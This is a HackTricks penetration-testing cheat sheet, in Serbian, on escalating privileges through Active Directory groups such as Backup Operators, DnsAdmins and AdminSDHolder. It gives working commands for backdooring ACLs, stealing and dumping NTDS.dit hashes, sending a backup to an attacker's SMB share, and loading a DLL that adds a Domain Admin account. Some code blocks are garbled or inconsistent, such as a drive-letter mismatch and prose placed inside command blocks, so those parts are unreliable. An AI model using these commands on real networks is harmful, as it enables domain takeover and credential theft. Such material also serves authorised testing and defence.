# Privileged Groups

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Dobro poznate grupe sa administratorskim privilegijama

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

## Account Operators

Ova grupa ima ovlašćenje da kreira naloge i grupe koje nisu administratori na domenu. Dodatno, omogućava lokalnu prijavu na Domain Controller (DC).

Da bi se identifikovali članovi ove grupe, izvršava se sledeća komanda:

```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC01.

## Grupa AdminSDHolder

Kontrolna lista pristupa (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory-ja, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava sigurnost ovih grupa sprečavajući neovlaštene izmjene.

Napadač bi mogao iskoristiti ovo tako što bi izmijenio ACL grupe **AdminSDHolder**, dodjeljujući punu dozvolu standardnom korisniku. To bi efektivno dalo tom korisniku potpunu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika promijene ili uklone, one će se automatski obnoviti u roku od jednog sata zbog dizajna sistema.

Komande za pregled članova i izmjenu dozvola uključuju:

```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

Skripta je dostupna kako bi se ubrzao proces obnove: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja, posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje izbrisanih objekata u Active Directory-ju, što može otkriti osetljive informacije:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

### Pristup kontroleru domena

Pristup datotekama na DC-u je ograničen osim ako korisnik nije deo grupe `Server Operators`, što menja nivo pristupa.

### Eskalacija privilegija

Korišćenjem `PsService` ili `sc` alata iz Sysinternals-a, moguće je pregledati i izmeniti dozvole servisa. Na primer, grupa `Server Operators` ima potpunu kontrolu nad određenim servisima, omogućavajući izvršavanje proizvoljnih komandi i eskalaciju privilegija:

```cmd
C:\> .\PsService.exe security AppReadiness
```

Ova komanda otkriva da `Server Operators` imaju pun pristup, omogućavajući manipulaciju servisima za povišene privilegije.

## Backup Operators

Članstvo u grupi `Backup Operators` omogućava pristup fajl sistemu `DC01` zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju prolazak kroz foldere, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći flag `FILE_FLAG_BACKUP_SEMANTICS`. Za ovaj proces je neophodno koristiti određene skripte.

Za listanje članova grupe, izvršite:

```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Lokalni napad

Da biste iskoristili ove privilegije lokalno, koriste se sledeći koraci:

1. Uvoz potrebnih biblioteka:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Omogućite i proverite `SeBackupPrivilege`:

```plaintext
Koraci za omogućavanje i proveru `SeBackupPrivilege` su sledeći:

1. Otvorite "Local Security Policy" (Lokalna sigurnosna politika) na ciljnom Windows sistemu.
2. Idite na "Local Policies" (Lokalne politike) > "User Rights Assignment" (Dodela prava korisnicima).
3. Pronađite pravo "Backup files and directories" (Rezervna kopija fajlova i direktorijuma) i dvaput kliknite na njega.
4. Dodajte željene korisnike ili grupe koje želite da imaju ovo pravo.
5. Kliknite na "Apply" (Primeni) i zatim na "OK" (U redu) da biste sačuvali promene.

Da biste proverili da li je `SeBackupPrivilege` uspešno omogućen, možete koristiti alat kao što je `whoami /priv` ili `secpol.msc`:

1. Otvorite Command Prompt (Komandna linija) kao administrator.
2. Unesite `whoami /priv` i pritisnite Enter.
3. Pronađite `SeBackupPrivilege` u listi i proverite da li je označeno sa "Enabled" (Omogućeno).

Napomena: Promene u lokalnoj sigurnosnoj politici mogu zahtevati ponovno pokretanje sistema da bi stupile na snagu.
```

Nakon što ste omogućili `SeBackupPrivilege`, korisnici ili grupe koje ste dodali će imati privilegiju rezervne kopije fajlova i direktorijuma. Ovo pravo omogućava korisnicima da pristupe i naprave rezervne kopije fajlova i direktorijuma za koje inače nemaju pristup.

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Pristupite i kopirajte fajlove iz ograničenih direktorijuma, na primer:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Napad

Direktan pristup fajl sistemu kontrolera domena omogućava krađu baze podataka `NTDS.dit`, koja sadrži sve NTLM heševe za korisnike i računare domena.

#### Korišćenje diskshadow.exe

1. Kreirajte senku (`shadow copy`) diska `C`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Kopirajte `NTDS.dit` iz sjenovite kopije:

```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternativno, koristite `robocopy` za kopiranje fajlova:

```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```

3. Izvucite `SYSTEM` i `SAM` za dobijanje heša:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

4. Preuzmite sve hešove iz `NTDS.dit` fajla:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

#### Korišćenje wbadmin.exe

1. Podesite NTFS datotečni sistem za SMB server na napadačkom računaru i keširajte SMB akreditive na ciljnom računaru.
2. Koristite `wbadmin.exe` za sistemsko bekapovanje i ekstrakciju `NTDS.dit`:

```cmd
net use X: \\<Napadačeva IP adresa>\naziv_deljenog_resursa /user:smbkorisnik lozinka
echo "Y" | wbadmin start backup -backuptarget:\\<Napadačeva IP adresa>\naziv_deljenog_resursa -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<datum-vreme> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Za praktičnu demonstraciju, pogledajte [DEMO VIDEO SA IPPSEC-om](https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610s).

## DnsAdmins

Članovi grupe **DnsAdmins** mogu iskoristiti svoje privilegije da učitaju proizvoljni DLL fajl sa privilegijama sistema na DNS serveru, koji se često nalazi na kontrolerima domena. Ova mogućnost pruža značajan potencijal za eksploataciju.

Za listanje članova grupe DnsAdmins, koristite:

```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Izvršavanje proizvoljnog DLL-a

Članovi mogu naterati DNS server da učita proizvoljni DLL (bilo lokalno ili sa udaljenog deljenog resursa) koristeći komande kao što su:

```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Pokretanje DNS servisa (što može zahtevati dodatne dozvole) je neophodno da bi se DLL učitao:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Za više detalja o ovom vektoru napada, pogledajte ired.team.

#### Mimilib.dll

Takođe je izvodljivo koristiti mimilib.dll za izvršavanje komandi, modifikujući je da izvršava određene komande ili reverzne školjke. [Proverite ovaj post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.

### WPAD zapis za MitM

DnsAdmins mogu manipulisati DNS zapisima kako bi izveli napade Man-in-the-Middle (MitM) stvaranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranja upita. Alati poput Responder-a ili Inveigh-a mogu se koristiti za spoofing i snimanje mrežnog saobraćaja.

### Čitači evidencija događaja

Članovi mogu pristupiti evidencijama događaja, potencijalno pronalazeći osetljive informacije poput lozinki u obliku čistog teksta ili detalja o izvršavanju komandi:

```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Dozvole

Ova grupa može izmeniti DACL-ove na objektu domena, potencijalno dodeljujući privilegije DCSync. Tehnike za eskalaciju privilegija koje iskorišćavaju ovu grupu detaljno su opisane u Exchange-AD-Privesc GitHub repozitorijumu.

```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

## Hyper-V Administratori

Hyper-V Administratori imaju potpuni pristup Hyper-V-u, što se može iskoristiti za preuzimanje kontrole nad virtualizovanim kontrolerima domena. To uključuje kloniranje aktivnih kontrolera domena i izvlačenje NTLM heševa iz NTDS.dit datoteke.

### Primer iskorišćavanja

Hyper-V Administratori mogu iskoristiti Firefox-ov Mozilla Maintenance Service da izvrše komande kao SYSTEM. To uključuje kreiranje tvrdog linka ka zaštićenoj SYSTEM datoteci i zamenjivanje iste zlonamernim izvršnim fajlom:

```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```

Napomena: Iskorišćavanje hard linkova je sprečeno u najnovijim Windows ažuriranjima.

## Upravljanje organizacijom

U okruženjima gde je implementiran **Microsoft Exchange**, postoji posebna grupa poznata kao **Organization Management** koja ima značajne mogućnosti. Ova grupa ima privilegiju **pristupa poštanskim sandučićima svih korisnika domena** i održava **potpunu kontrolu nad Organizacionom jedinicom (OU) 'Microsoft Exchange Security Groups'**. Ova kontrola uključuje grupu **`Exchange Windows Permissions`**, koja se može iskoristiti za eskalaciju privilegija.

### Iskorišćavanje privilegija i komande

#### Print Operators

Članovi grupe **Print Operators** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koji im omogućava da se **prijave lokalno na kontroler domena**, ga isključe i upravljaju štampačima. Da bi se iskoristile ove privilegije, posebno ako **`SeLoadDriverPrivilege`** nije vidljiv u kontekstu bez povišenih privilegija, neophodno je zaobići Kontrolu korisničkog naloga (UAC).

Za prikazivanje članova ove grupe koristi se sledeća PowerShell komanda:

```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Za detaljnije tehnike eksploatacije vezane za **`SeLoadDriverPrivilege`**, trebalo bi se konsultovati određene sigurnosne resurse.

#### Korisnici udaljenog radnog prostora

Članovi ove grupe imaju pristup računarima putem protokola za udaljeni radni prostor (RDP). Za enumeraciju ovih članova dostupne su PowerShell komande:

```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Dodatne informacije o iskorišćavanju RDP-a mogu se pronaći u posebnim resursima za pentestiranje.

#### Korisnici za daljinsko upravljanje

Članovi mogu pristupiti računarima putem **Windows Remote Management (WinRM)**. Nabrojavanje ovih članova postiže se putem:

```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Za tehnike eksploatacije vezane za **WinRM**, treba se konsultovati odgovarajuća dokumentacija.

#### Server Operators

Ova grupa ima dozvole za izvršavanje različitih konfiguracija na kontrolerima domena, uključujući privilegije za backup i restore, promenu vremena sistema i gašenje sistema. Za enumeraciju članova, koristi se sledeća komanda:

```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

## Reference <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
